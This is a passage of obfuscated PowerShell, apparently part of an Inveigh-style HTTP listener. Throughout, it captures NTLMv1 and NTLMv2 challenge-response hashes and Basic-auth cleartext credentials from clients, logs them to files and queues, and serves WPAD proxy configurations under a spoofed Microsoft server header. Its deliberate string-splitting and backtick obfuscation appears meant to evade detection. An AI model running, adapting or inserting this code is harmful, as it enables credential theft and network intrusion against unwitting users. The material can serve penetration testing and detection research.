                ${HtTP`_`H`Eader_aUthoRI`ZaTion} = ${http_HE`A`D`ER_AutHO`RI`zatION} -replace ("{1}{0}" -f'TLM ','N'),''
                [Byte[]]${H`Ttp_r`eQU`est`_by`TES} =   ${v`WE}::("{1}{0}{2}{3}{4}" -f 'e64','FromBas','Str','in','g').Invoke(${HTTp_`heADer`_auth`or`IZATION})
            
                if( (  get-VARiABle 5e9a )."vA`LUe"::"ToS`TR`INg"(${hTt`p_`R`e`qUE`sT_bytEs}[8..11]) -eq ("{2}{0}{1}" -f '00','-00-00','01-'))
                {
                    ${Nt`lm} = &("{3}{2}{4}{0}{1}" -f'eBase6','4','alle','NTLMCh','ng') ${ChA`LLe`NgE} ${H`TTpNTlM`E`ss} ${h`T`TP_`sOUrce_IP} ${HT`TP_`cli`ent}."clI`ent"."R`eMOtee`N`DpO`inT"."p`OrT"
                }
                elseif(  ( Gi ('v'+'a'+'RIaBl'+'e'+':5e9A')  )."Va`LuE"::"Tos`T`RiNg"(${http_R`eQueS`T`_b`YTes}[8..11]) -eq ("{3}{2}{1}{0}"-f'00-00','0-','0','03-'))
                {
                    ${HtTP_NTlm_Le`N`g`Th} = &("{2}{1}{0}"-f'th2','taLeng','Da') 20 ${http_`REquest_by`T`es}
                    ${hTTp`_n`T`lm_oFf`Set} = &("{0}{3}{1}{2}" -f'D','h','4','ataLengt') 24 ${HttP_rEq`Ues`T_b`YTes}
                    ${hTTp_`N`TLM_`d`OMai`N_`LENg`TH} = &("{1}{2}{0}"-f 'Length2','D','ata') 28 ${hTt`P_Re`QuE`ST_bytEs}
                    ${HtT`P`_nTlm_dom`A`in_`of`F`seT} = &("{1}{2}{0}" -f'gth4','DataL','en') 32 ${hTt`P_r`eQ`UEsT_By`Tes}
                    [String]${NTlM_`c`hALl`eNgE} = ${INVe`IgH}."hTtp_C`HAlLe`N`g`e_que`Ue" -like ${H`TTp`_`sOurc`e_iP} + ${Ht`T`P_cLIENT}."clIe`NT"."rEmoTE`EnDPO`i`Nt"."P`ort" + '*'
                    ${In`Ve`igH}."htTP_c`HaLLE`N`G`E_`QUEuE".("{0}{1}"-f'Remov','e').Invoke(${nT`lm_`C`hALlEn`Ge})
                    ${nTLM_CHA`l`LEnGe} = ${Nt`lM_challe`Nge}.("{2}{1}{0}"-f'g','bstrin','Su').Invoke((${n`Tl`M`_C`haLLENGe}.("{1}{0}"-f 'f','IndexO').Invoke(",")) + 1)
                       
                    if(${HtTP_`Nt`Lm_`dO`main_lE`NG`Th} -eq 0)
                    {
                        ${HtT`P_ntlM_domaI`N`_`STriNg} = ""
                    }
                    else
                    {  
                        ${h`TTP_`NtL`m`_doma`iN`_`STrING} = &("{0}{1}{2}" -f 'Da','t','aToString') ${HTTp_n`Tlm`_dOmaiN_O`FF`sET} ${HT`Tp`_nTlm_d`OmAI`N_`leNgth} ${h`T`TP_`REqU`e`St_byTEs}
                    } 
                    
                    ${h`T`Tp_ntL`M_USeR_lENGtH} = &("{2}{0}{1}" -f'taLengt','h2','Da') 36 ${htt`p_`ReqUest_by`TES}
                    ${HTTp_`NTLm`_USE`R_OF`FSet} = &("{3}{0}{2}{1}" -f 'e','4','ngth','DataL') 40 ${H`TtP_R`Eq`UE`St_`By`Tes}
                    ${h`TT`P_ntlm`_`USe`R_stRING} = &("{1}{0}{2}"-f'Str','DataTo','ing') ${HtTp_`NtL`M_U`SE`R_`Off`Set} ${H`T`TP_ntL`M_`US`E`R_LEngTH} ${HTTp_R`eqUeS`T`_`B`y`Tes}
                    ${htTp`_`NTlM_`Ho`ST_leNgTh} = &("{0}{1}{2}{3}" -f 'D','ataLen','g','th2') 44 ${ht`T`p_reqUeST_b`YtES}
                    ${hTtP_nTlm_`hO`s`T_o`Ff`set} = &("{0}{2}{1}{3}" -f 'Data','t','Leng','h4') 48 ${HTtp_`Req`U`eS`T_`Byt`eS}
                    ${H`Ttp_`Nt`Lm`_H`oS`T_StRiNg} = &("{1}{2}{3}{0}"-f'ring','DataT','o','St') ${HT`TP_nTlM`_H`o`st_OF`F`seT} ${hTTp`_n`TLM`_`H`osT`_LeNGth} ${HTt`p_R`E`qU`Est_b`YTEs}
        
                    if(${h`Ttp`_NTLm_LEN`GTH} -eq 24) 
                    {
                        ${nTl`M`_res`POnsE} =   ( Gci  VARiaBLE:5E9a)."Va`LUe"::"tOS`TRI`NG"(${Htt`P_r`EQueST_`B`y`T`eS}[(${httP_`NT`Lm_`OFFSEt} - 24)..(${HT`TP_nt`lM_`o`FfSET} + ${htt`P_n`TlM_LeN`gtH})]) -replace "-",""
                        ${NTl`M_r`Es`pO`Nse} = ${ntLm`_Resp`OnsE}.("{1}{0}{2}"-f'er','Ins','t').Invoke(48,':')
                        ${HTT`p_nTLm`_`HasH} = ${Htt`p_ntLM_USer_`St`Ri`NG} + "::" + ${hT`Tp_N`Tlm_`DOmain_sT`RiNG} + ":" + ${NTLm`_`REsp`o`NSE} + ":" + ${ntlM`_`chaLLeN`Ge}
                    
                        if(${Nt`Lm`_CHall`enGe} -and ${Nt`LM_`RESP`onsE} -and (${INv`EI`gh}."mAcH`ine_AccOun`Ts" -or (!${iN`Ve`Igh}."MAchin`E_A`cCo`UNts" -and -not ${hTTP_NTlm_Use`R`_sTr`Ing}.("{0}{1}" -f'En','dsWith').Invoke('$'))))
                        {          
                            ${iN`VEI`Gh}."N`TLMv1_l`iSt".("{0}{1}" -f 'Ad','d').Invoke(${HTt`p`_NT`lm_haSH})

                            if(${i`NVEi`gh}."F`il`e_Out`puT")
                            {
                                ${i`Nv`EiGh}."LO`G_f`iLE_q`UeUe".("{0}{1}" -f'A','dd').Invoke(("$(Get-Date -format 's') - $HTTP_type NTLMv1 challenge/response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string captured from $HTTP_source_IP($HTTP_NTLM_host_string) "))
                            }

                            if(${InV`EI`gH}."log`_`Ou`TPUT")
                            {
                                ${INv`eIGh}."L`OG".("{1}{0}" -f'd','Ad').Invoke(("$(Get-Date -format 's') - $HTTP_type NTLMv1 challenge/response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string captured from $HTTP_source_IP($HTTP_NTLM_host_string) "))
                            }
                        
                            if(!${INVE`i`GH}."CoN`So`Le`_UniQUe" -or (${in`VeIgh}."cONsoLe`_`UN`iqUe" -and ${inve`iGh}."nTLMV`1_useR`Nam`E_l`ISt" -notcontains ("$HTTP_source_IP "+"$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string")))
                            {
                                ${i`Nv`eigh}."COn`SoL`e_Que`Ue".("{0}{1}"-f 'A','dd').Invoke($(&("{1}{0}"-f'e','Get-Dat') -format 's') + (' '+'- '+"$HTTP_type "+'NTLMv1'+' '+'c'+'hall'+'e'+'nge/resp'+'on'+'se '+'captu'+'re'+'d '+'from'+' '+"$HTTP_source_IP($HTTP_NTLM_host_string):`n$HTTP_NTLM_hash"))
                            }
                            else
                            {
                                ${I`NV`eIgH}."c`oNsoLE`_`qUEue".("{0}{1}" -f 'A','dd').Invoke($(&("{1}{0}"-f't-Date','Ge') -format 's') + (' '+'- '+"$HTTP_type "+'NTL'+'Mv'+'1 '+'challenge/re'+'s'+'pon'+'s'+'e '+'captu'+'red'+' '+'fr'+'om '+"$HTTP_source_IP($HTTP_NTLM_host_string):`n$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string "+'- '+'not'+' '+'un'+'iq'+'ue'))
                            }

                            if(${I`NVe`IGH}."FiLE_o`UT`P`UT" -and (!${iNVe`iGh}."fILE_u`NIq`Ue" -or (${I`N`VEiGh}."fIlE`_u`Niq`UE" -and ${InV`eI`gh}."NTL`mv1_`U`s`ErNaM`E_l`ISt" -notcontains ("$HTTP_source_IP "+"$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string"))))
                            {
                                ${in`VEigH}."N`T`lm`V1_FIl`E_QUeUE".("{1}{0}"-f'dd','A').Invoke(${HtT`P`_nTlM_H`AsH})
                                ${I`N`VEIGh}."CONsol`E_que`Ue".("{1}{0}" -f 'dd','A').Invoke(("$HTTP_type "+'NTLM'+'v'+'1 '+'chall'+'eng'+'e/respo'+'nse '+'writt'+'en '+'to'+' '+'') + ${iN`VEIgh}."n`Tlm`V1_`oUt_FILe")
                            }

                            if(${i`N`VEIGH}."n`Tl`M`V1_u`SErn`Ame_LI`st" -notcontains ("$HTTP_source_IP "+"$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string"))
                            {
                                ${iN`VeiGh}."ntLM`V1_U`S`eRNAMe_L`IsT".("{1}{0}"-f 'dd','A').Invoke(("$HTTP_source_IP "+"$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string"))
                            }

                        }

                    }
                    else 
                    {         
                        ${NT`Lm`_ResP`o`Nse} =   ${5E`9a}::"T`os`Tring"(${htt`P_R`EQ`U`est_BYTes}[${hTTp_nT`Lm_`oF`FseT}..(${Ht`TP_NT`l`M`_off`set} + ${HTT`p`_NtLM_Le`NG`TH})]) -replace "-",""
                        ${Ntlm_R`e`sPo`NSE} = ${N`Tl`m_Re`SPOnse}.("{2}{0}{1}" -f'nse','rt','I').Invoke(32,':')
                        ${h`TTP_ntL`M_hASH} = ${hTtp_N`Tlm_usER_ST`R`i`NG} + "::" + ${Http_nTLm`_d`O`ma`I`N_sT`RINg} + ":" + ${n`TL`m_Cha`L`lENGE} + ":" + ${N`TLm_R`ESp`o`NSe}

                        if(${n`T`Lm`_ch`AlLEngE} -and ${n`TLM_`R`eSPON`SE} -and (${in`V`EIgH}."MaCHin`e_`Ac`C`OuntS" -or (!${In`VEi`Gh}."m`Ac`hiNe_aCcouN`Ts" -and -not ${h`Tt`P_`Nt`L`m_UsEr_S`TRiNG}.("{1}{0}{2}"-f'it','EndsW','h').Invoke('$'))))
                        {
                            ${iNV`e`igh}."Ntlm`V`2`_LIst".("{0}{1}"-f 'Ad','d').Invoke(${hTTp_N`T`Lm`_hasH})

                            if(${InvE`IGh}."fI`l`e_Out`Put")
                            {
                                ${In`V`eIGh}."LOG_fil`E`_`Qu`EUe".("{0}{1}" -f 'Ad','d').Invoke($(&("{2}{1}{0}" -f'Date','-','Get') -format 's') + (' '+'- '+"$HTTP_type "+'N'+'TLM'+'v2 '+'challen'+'g'+'e/'+'respons'+'e '+'f'+'or '+"$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string "+'captu'+'red'+' '+'fr'+'om '+"$HTTP_source_IP($HTTP_NTLM_host_string)"))
                            }

                            if(${i`Nv`eiGh}."lOG`_ou`TPUt")
                            {
                                ${i`NV`EiGh}."l`Og".("{1}{0}"-f 'dd','A').Invoke($(&("{0}{1}"-f 'Ge','t-Date') -format 's') + (' '+'- '+"$HTTP_type "+'NTLM'+'v2 '+'ch'+'a'+'lleng'+'e/response '+'f'+'or '+"$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string "+'captur'+'e'+'d '+'fr'+'om '+"$HTTP_source_IP($HTTP_NTLM_host_string)"))
                            }
                        
                            if(!${In`V`Eigh}."c`onsO`le_`UniQuE" -or (${Invei`Gh}."cONS`o`LE`_uNI`qUe" -and ${iNV`ei`GH}."NtLM`V`2_`US`eRna`ME_l`Ist" -notcontains ("$HTTP_source_IP "+"$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string")))
                            {
                                ${INVE`IGh}."consOL`e_`Q`UEue".("{1}{0}" -f'd','Ad').Invoke($(&("{2}{1}{0}"-f't-Date','e','G') -format 's') + (' '+'- '+"$HTTP_type "+'NTLM'+'v'+'2 '+'chal'+'leng'+'e/r'+'e'+'spon'+'se '+'c'+'aptured'+' '+'from'+' '+"$HTTP_source_IP($HTTP_NTLM_host_string):`n$HTTP_NTLM_hash"))
                            }
                            else
                            {
                                ${iN`VeI`gh}."c`ONso`lE_Que`UE".("{0}{1}"-f 'Ad','d').Invoke($(&("{1}{2}{0}"-f'ate','Get','-D') -format 's') + (' '+'- '+"$HTTP_type "+'NTLM'+'v2'+' '+'c'+'hall'+'enge/res'+'pons'+'e'+' '+'capt'+'ured'+' '+'fro'+'m '+"$HTTP_source_IP($HTTP_NTLM_host_string):`n$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string "+'- '+'no'+'t '+'u'+'n'+'ique'))
                            }

                            if(${i`NVeI`gH}."FIlE_`oUtP`Ut" -and (!${InV`eI`GH}."fil`E_U`NiQUe" -or (${IN`Ve`igH}."F`Il`e_UNiQUE" -and ${i`NV`EIgH}."NTlmv2_us`ErN`Ame_`L`isT" -notcontains ("$HTTP_source_IP "+"$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string"))))
                            {
                                ${I`N`VeIgh}."ntl`mv2_`F`iL`E_queUE".("{0}{1}" -f 'Ad','d').Invoke(${hT`Tp`_nTLm`_`HAsh})
                                ${iN`V`eIGh}."cONs`OLE_q`UE`UE".("{0}{1}"-f 'A','dd').Invoke(("$HTTP_type "+'NTLMv'+'2 '+'ch'+'a'+'llenge/respo'+'nse '+'w'+'ri'+'tten '+'t'+'o '+'') + ${inve`I`GH}."nTL`m`V2_ouT_f`ILe")
                            }

                            if(${iN`VeI`GH}."nT`lmv2_U`s`e`RN`AmE_LisT" -notcontains ("$HTTP_source_IP "+"$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string"))
                            {
                                ${InVe`I`Gh}."NtlMV2_u`SE`RN`A`Me_liSt".("{1}{0}" -f'dd','A').Invoke(("$HTTP_source_IP "+"$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string"))
                            }
                        
                        }

                    }

                    if (${in`Ve`IGH}."i`p`_cAPtURE`_LiST" -notcontains ${h`TTp_s`o`URce_`IP} -and -not ${hTTp`_NTlM_UseR_s`T`Ri`NG}.("{0}{1}{2}" -f 'EndsWi','t','h').Invoke('$') -and !${iNve`I`Gh}."SPOO`Fer_R`E`PEaT" -and ${Ht`Tp`_SoUr`CE_Ip} -ne ${ip})
                    {
                        ${i`NV`eIGh}."ip_c`Ap`T`UrE_LiSt".("{0}{1}"-f 'A','dd').Invoke(${hTtp_`SO`U`R`CE_Ip})
                    }
                
                    ${h`Ttp_rES`pons`E_stA`TUs_`codE} = 0x32,0x30,0x30
                    ${Ht`TP_RE`sP`ON`SE_`Phr`AsE} = 0x4f,0x4b
                    ${http_`C`li`e`NT_ClOsE} = ${TR`Ue}
                    ${N`Tl`m_chAlLE`N`ge} = ""

                    if(${PRO`Xy_l`isT`e`NEr})
                    {
                        
                        if(${hTt`p`ResPoN`se} -or ${hTT`PD`IR})
                        {
                            ${h`TTP_HEADEr_`cA`ChE_CO`NTRoL} = 0x43,0x61,0x63,0x68,0x65,0x2d,0x43,0x6f,0x6e,0x74,0x72,0x6f,0x6c,0x3a,0x20,0x6e,0x6f,0x2d,0x63,0x61,0x63,0x68,0x65,0x2c,0x20,0x6e,0x6f,0x2d,0x73,0x74,0x6f,0x72,0x65
                        }
                        else
                        {
                            ${ht`Tp`_SE`ND} = ${f`A`lse}
                        }

                    }

                }
                else
                {
                    ${HTTp_C`Li`ENt_Clo`sE} = ${t`RuE}
                }

            }
            elseif(${HTt`p`_H`EadEr_`Author`IZatIoN}.("{2}{0}{1}"-f 'tsw','ith','star').Invoke(("{0}{1}"-f'Bas','ic ')))
            {
                ${hTtP`_`Re`sPo`NSe_stA`TuS_`CoDe} = 0x32,0x30,0x30
                ${ht`Tp_`ReSPON`Se_PHrA`se} = 0x4f,0x4b
                ${htt`p_`HEadE`R_`AUTHOri`za`Ti`oN} = ${h`TT`p`_`HeaDe`R`_aUTho`RiZA`Tion} -replace ("{0}{1}"-f'Bas','ic '),''
                ${cLear`T`EX`T_`CrED`Enti`Als} =   (dIr varIabLE:ln5h)."VA`lUe"::"UT`F8"."GE`TS`TRING"(  ( GCI  vARiABlE:vwE )."vaL`Ue"::("{0}{3}{1}{2}" -f 'FromB','Stri','ng','ase64').Invoke(${HttP_`He`ADeR_AU`T`HoR`izaT`iON}))
                ${htTp`_c`li`e`N`T_clOSE} = ${tR`UE}
                ${I`Nv`eIGH}."c`LE`ARte`x`T_FIl`e_qUEuE".("{1}{0}" -f 'd','Ad').Invoke(${C`lE`AR`T`eXT_CrE`dENT`IAlS})
                ${In`VE`igH}."C`leArT`eXT_LIST".("{0}{1}" -f'A','dd').Invoke(${c`LeArtEx`T`_Cred`E`N`TiALs})
                ${inVE`Igh}."cOnso`lE_`q`Ueue".("{1}{0}"-f'd','Ad').Invoke(("$(Get-Date -format 's') - $HTTP_type Basic auth cleartext credentials $cleartext_credentials captured from $HTTP_source_IP "))

                if(${i`NvEi`Gh}."fIle_ou`Tp`UT")
                {
                    ${INvE`igH}."Con`soLE_`QU`EuE".("{1}{0}" -f'dd','A').Invoke(("$HTTP_type "+'Basic'+' '+'aut'+'h '+'cl'+'ea'+'rt'+'ext '+'credenti'+'al'+'s '+'w'+'ri'+'tten '+'to'+' '+'') + ${inV`eIgh}."Cl`eArTExT`_out_`FIlE")
                    ${I`NveIGH}."lo`G_filE_Q`UeUE".("{0}{1}"-f'A','dd').Invoke(("$(Get-Date -format 's') - Basic auth cleartext credentials captured from $HTTP_source_IP "))
                }

                if(${iNV`EIGH}."LOG_o`Utp`UT")
                {
                    ${iN`Ve`iGh}."l`oG".("{0}{1}" -f 'A','dd').Invoke(("$(Get-Date -format 's') - Basic auth cleartext credentials captured from $HTTP_source_IP "))
                }
                 
            }

            if((${Ht`T`p_ReQuest_r`AW_U`Rl} -notmatch ("{2}{1}{0}" -f't','wpad.da','/') -and ${htT`pAU`TH} -eq ("{1}{0}{2}"-f 'n','Ano','ymous')) -or (${H`TTp`_re`qUES`T`_`RAw_URl} -match ("{1}{0}{2}"-f'wpad.d','/','at') -and ${w`p`ADAUth} -eq ("{0}{2}{1}" -f 'An','ymous','on')) -or (
            ${wp`A`DA`UTHigNOrE}."C`OUnT" -gt 0 -and ${w`pAd`AUTH} -like ("{0}{1}" -f 'NTL','M*') -and (${wPadA`UthiG`N`ore} | &("{1}{0}{2}" -f'e-O','Wher','bject') {${hTtp_he`ADeR`_use`R_a`G`ENT} -match ${_}})) -or ${HtTP_`C`li`En`T_clO`se})
            {

                if(${HtTP`D`iR} -and ${H`T`TpD`eFaul`TexE} -and ${hTt`p_rEquEST_RA`W_`Url} -like ("{1}{0}"-f'.exe','*') -and (&("{0}{1}"-f'Test-Pat','h') (&("{1}{0}{2}"-f 'in-','Jo','Path') ${HtT`Pdir} ${ht`TPDefa`UL`TexE})) -and !(&("{1}{0}"-f'est-Path','T') (&("{0}{2}{1}"-f 'Join','Path','-') ${hTt`PdIR} ${h`TtP_REQUE`S`T`_`Raw_URl})))
                {
                    [Byte[]]${HTtp_mE`SSAGE`_`ByTEs} =   ${J`Me}::("{3}{1}{0}{2}" -f 'ad','e','AllBytes','R').Invoke((&("{1}{0}{2}"-f'-','Join','Path') ${htT`pd`ir} ${httPD`Ef`A`ULTe`XE}))
                    ${ht`Tp_`HEader_COnt`E`NT_t`yPe} = 0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x54,0x79,0x70,0x65,0x3a,0x20 +   (  variaBle ("LN"+"5h") -vaL)::"u`Tf8".("{1}{0}"-f 'etBytes','G').Invoke(("{0}{3}{2}{4}{1}" -f 'app','e','ion','licat','/ex'))
                }
                elseif(${h`T`TPdiR})
                {

                    if(${HTTpDEfA`ULT`F`ILE} -and !(&("{0}{1}" -f'Test-','Path') (&("{2}{1}{0}"-f'h','-Pat','Join') ${Htt`PdIr} ${HttP`_`REQ`Ue`ST_rAW_`U`RL})) -and (&("{1}{0}{2}" -f 's','Te','t-Path') (&("{0}{1}{2}"-f 'Join-','Pa','th') ${H`TTPD`ir} ${H`TtP`deFaul`TFILe})) -and ${H`TTp_`RE`Q`UEST_rAW_`URL} -notmatch ("{2}{1}{0}"-f 't','a','/wpad.d'))
                    {
                        [Byte[]]${h`TtP`_ME`sSAg`E_`ByTES} =  (gET-VARIABlE  ('JM'+'e') -Valu )::("{0}{2}{1}" -f 'ReadAllByt','s','e').Invoke((&("{3}{2}{1}{0}" -f'Path','-','n','Joi') ${hTt`pDIr} ${HT`TPdef`AUlt`Fi`le}))
                    }
                    elseif((${hT`T`pdeFaul`T`File} -and ${Ht`Tp_REQ`Ue`s`T_R`Aw_U`Rl} -eq '' -or ${HtT`PdEFau`Lt`FiLe} -and ${h`Tt`p_Requ`eSt_r`Aw_Url} -eq '/') -and (&("{1}{0}" -f'th','Test-Pa') (&("{2}{1}{0}"-f'n-Path','i','Jo') ${HttpD`ir} ${H`T`TPde`FAulTf`ilE})))
                    {
                        [Byte[]]${H`TTP_mEs`Sa`GE_bytES} =  (vaRIablE JME  )."v`ALUE"::("{3}{0}{2}{1}" -f 'AllByt','s','e','Read').Invoke((&("{1}{2}{0}"-f 'h','Join','-Pat') ${h`TT`PdIr} ${ht`TPD`ef`AuLTfiLE}))
                    }
                    elseif(${Wp`A`D`RESpoN`SE} -and ${ht`T`P_R`EQUeS`T`_RAW_uRL} -match ("{1}{0}"-f 'dat','/wpad.'))
                    {
                        [Byte[]]${HT`Tp_MeSsAgE_`B`YtEs} =  ${l`N5H}::"ut`F8".("{2}{1}{0}"-f 'es','t','GetBy').Invoke(${WPad`Re`SPONsE})
                        ${htTp_hEaDE`R_CONTE`Nt`_tY`PE} = 0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x54,0x79,0x70,0x65,0x3a,0x20 +   (  chIlditeM  VariabLE:ln5H)."v`AlUe"::"Ut`F8".("{0}{1}" -f 'GetByt','es').Invoke(("{6}{0}{9}{8}{3}{7}{5}{1}{4}{2}"-f'pp','n','ig','y-auto','f','o','a','c','x-ns-prox','lication/'))
                    }
                    else
                    {

                        if(&("{0}{2}{1}"-f 'T','Path','est-') (&("{1}{2}{0}" -f 'ath','Joi','n-P') ${h`TtPD`iR} ${H`TTP_ReQU`Es`T_RA`w_u`Rl}))
                        {
                            [Byte[]]${HTTp_MeS`S`AGe`_b`y`TeS} =   (Get-vARiAbLe  JmE)."vA`LuE"::("{3}{1}{0}{2}"-f 'lByte','l','s','ReadA').Invoke((&("{0}{1}{2}"-f 'J','oin-Pat','h') ${h`TtP`dIR} ${hT`TP`_rEqu`Est_RAw`_`UrL}))
                        }
                        else
                        {
                            [Byte[]]${HtTP`_mES`S`A`ge_`ByteS} =   (  gET-VARIaBLe Ln5H -VAluEoN )::"ut`F8".("{1}{2}{0}"-f'tes','GetB','y').Invoke(${h`TT`PResP`O`NSe})
                        }
            
                    }

                }
                else
                {
                
                    if(${WpaDRES`PO`N`SE} -and ${HT`Tp_Re`QueSt_r`Aw`_u`Rl} -match ("{2}{0}{1}"-f 'p','ad.dat','/w') -and (!${PrO`X`YIgnOrE} -or !(${p`RoXy`IGN`oRE} | &("{0}{2}{3}{1}" -f'W','ect','h','ere-Obj') {${HT`Tp_`heAd`ER_uSe`R_`A`GE`NT} -match ${_}})))
                    {
                        ${H`TTP_m`eS`sa`ge} = ${wp`A`dR`eSp`ONSe}
                        ${hTtP_H`eADeR`_`C`ontEn`T`_t`ype} = 0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x54,0x79,0x70,0x65,0x3a,0x20 +   (  gi  VARIaBLe:Ln5h)."VA`LUe"::"U`Tf8".("{1}{2}{0}"-f'es','Get','Byt').Invoke(("{7}{1}{3}{2}{4}{0}{6}{5}"-f 'roxy-autoco','pl','tio','ica','n/x-ns-p','ig','nf','ap'))
                    }
                    elseif(${h`T`T`PrEsPOnsE})
                    {
                        ${H`Tt`p_MEss`AgE} = ${H`Ttp`RE`sp`onSE}
                        
                        if(${h`TTpcO`NtE`NT`TYPe})
                        {
                            ${ht`T`P_Head`Er_`C`ON`TENt_`TypE} = 0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x54,0x79,0x70,0x65,0x3a,0x20 +  ${l`N5h}::"ut`F8".("{2}{1}{0}"-f 'es','Byt','Get').Invoke(${h`TtPc`O`N`TENttYPE})
                        }

                    }

                    [Byte[]]${hTTp_m`eS`sagE`_ByTEs} =   (gcI  VARIABLe:ln5H )."Va`lUE"::"ut`F8".("{0}{2}{1}"-f'Get','tes','By').Invoke(${H`Ttp_mES`sa`GE})
                }

            }
            else
            {
                [Byte[]]${HTt`P_`M`e`S`sAGe_byTes} =   (  geT-VARiABLe ('l'+'n5h')  -VAlUEO )::"U`TF8".("{0}{2}{1}"-f'Ge','ytes','tB').Invoke(${hTt`p_`mEsSagE})
            }

            ${HT`Tp_`TIMeSt`AmP} = &("{0}{1}" -f 'Get-','Date') -format ('r')
            ${H`TTp_`Ti`MeSta`Mp} =   ( ItEm  VARiAble:LN5h)."vA`lUE"::"u`Tf8".("{2}{1}{0}"-f's','te','GetBy').Invoke(${HTtp_T`I`M`estaMp})
            ${H`TTP_HE`AD`Er`_`cONT`Ent`_leng`Th} = 0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x4c,0x65,0x6e,0x67,0x74,0x68,0x3a,0x20 +  ${L`N5h}::"u`TF8".("{0}{1}" -f 'GetByte','s').Invoke(${htTp`_M`eSsAGe_`Byt`es}."LE`NgtH")

            if((${ht`TpA`UTH} -like ("{0}{1}"-f'NT','LM*') -and ${H`TTP`_r`EqU`esT_r`Aw_URL} -notmatch ("{0}{2}{1}"-f'/wpad.d','t','a')) -or (${WPA`D`AUTh} -like ("{1}{0}" -f'M*','NTL') -and ${hTtp_rEQUes`T`_`R`AW_U`RL} -match ("{2}{1}{0}" -f'd.dat','pa','/w')) -and !${HT`TP`_`C`LienT`_cLose})
            {
                ${Http`_h`eAdEr_`A`Uthent`i`CAt`E_dA`Ta} =  (vaRIABle  ('Ln'+'5h') -VALuEo )::"UT`F8".("{0}{1}{2}" -f 'G','et','Bytes').Invoke(${NT`lM})
            }
            elseif((${hT`TPAU`TH} -eq ("{0}{1}"-f'B','asic') -and ${h`TTP_r`equeS`T`_RAw_url} -notmatch ("{1}{2}{0}" -f'.dat','/wpa','d')) -or (${W`paDA`Uth} -eq ("{1}{0}"-f 'c','Basi') -and ${Htt`p`_rEqUeS`T_ra`w_u`RL} -match ("{2}{0}{3}{1}" -f 'pa','t','/w','d.da')))
            {
                ${http`_HeADEr_A`U`THEnti`ca`TE_DAtA} =  ( VAriAbLe ('lN'+'5H')  -VaLuEoNly )::"UT`F8".("{0}{2}{1}"-f 'GetByt','s','e').Invoke(('Bas'+'ic '+"realm=$HTTPBasicRealm"))
            }

            ${PAc`ke`T_`hTtPrE`sp`ONSE} = &("{1}{0}{2}" -f'b','New-O','ject') ("{6}{4}{7}{5}{8}{2}{1}{0}{3}"-f 'der','ized.Or','Special','edDictionary','o','lections','System.C','l','.')
            ${P`AckET_h`T`TPReSPON`sE}.("{1}{0}" -f 'dd','A').Invoke(("{4}{2}{0}{1}{7}{5}{3}{6}" -f 'PRes','po','TT','e','H','V','rsion','nse_Request'),[Byte[]](0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20))
            ${p`ACKe`T`_`hTtp`RESP`ONSe}.("{0}{1}" -f'Ad','d').Invoke(("{5}{4}{2}{3}{0}{6}{1}"-f'ns','ode','PResp','o','T','HT','e_StatusC'),${httP`_`Res`P`On`Se_StATuS`_cOde} + [Byte[]](0x20))
            ${P`AcK`ET_hT`T`PrESpOnsE}.("{1}{0}"-f 'd','Ad').Invoke(("{3}{4}{5}{0}{2}{1}" -f'e','rase','_ResponsePh','HTTPRe','spon','s'),${Http_re`SponS`e`_PH`Rase} + [Byte[]](0x0d,0x0a))
            ${PAc`ket_HT`T`pRe`spOn`Se}.("{1}{0}" -f'd','Ad').Invoke(("{0}{4}{1}{3}{5}{2}" -f 'H','se','ver','_','TTPRespon','Ser'),[Byte[]](0x53,0x65,0x72,0x76,0x65,0x72,0x3a,0x20,0x4d,0x69,0x63,0x72,0x6f,0x73,0x6f,0x66,0x74,0x2d,0x48,0x54,0x54,0x50,0x41,0x50,0x49,0x2f,0x32,0x2e,0x30,0x0d,0x0a))
            ${p`Ac`KeT_HTT`P`R`EspO`NsE}.("{0}{1}"-f'Ad','d').Invoke(("{5}{4}{3}{1}{0}{2}"-f '_TimeStam','onse','p','TPResp','T','H'),[Byte[]](0x44,0x61,0x74,0x65,0x3a,0x20) + ${HT`Tp`_t`imEStAMp} + [Byte[]](0x0d,0x0a))
            ${pa`CK`ET_htT`PreSPo`N`se}.("{0}{1}" -f'A','dd').Invoke(("{1}{0}{3}{4}{2}"-f'PRespons','HTT','Length','e_','Content'),${HttP_hEaDeR_`cO`Nt`en`T`_`LenGTH} + [Byte[]](0x0d,0x0a))

            if(${htTP_headEr`_AuT`H`EnTi`CA`TE} -and ${h`T`TP_headEr_aUtheNTi`C`A`TE_D`ATa})
            {
                ${PacKE`T_htTp`R`eSpOnse}.("{0}{1}"-f 'A','dd').Invoke(("{1}{4}{5}{2}{3}{0}"-f 'er','HTTP','t','icateHead','Res','ponse_Authen'),${HTtp_`H`E`AdEr`_aU`ThENTiCaTE} + ${htT`p_hE`A`dER_Au`Th`enT`IcAte_`DA`TA} + [Byte[]](0x0d,0x0a))
            }

            if(${hT`TP_He`AdEr`_C`ontenT`_TY`pE})
            {
                ${P`ACKe`T_H`T`TPR`ES`ponSe}.("{1}{0}"-f 'dd','A').Invoke(("{1}{3}{4}{5}{2}{0}{6}" -f'e_Conte','HTT','ons','P','R','esp','ntType'),${HTTP_hEaDEr`_COnTen`T_`Ty`Pe} + [Byte[]](0x0d,0x0a))
            }

            if(${h`TtP_`hE`A`dER_CacHe`_Con`Trol})
            {
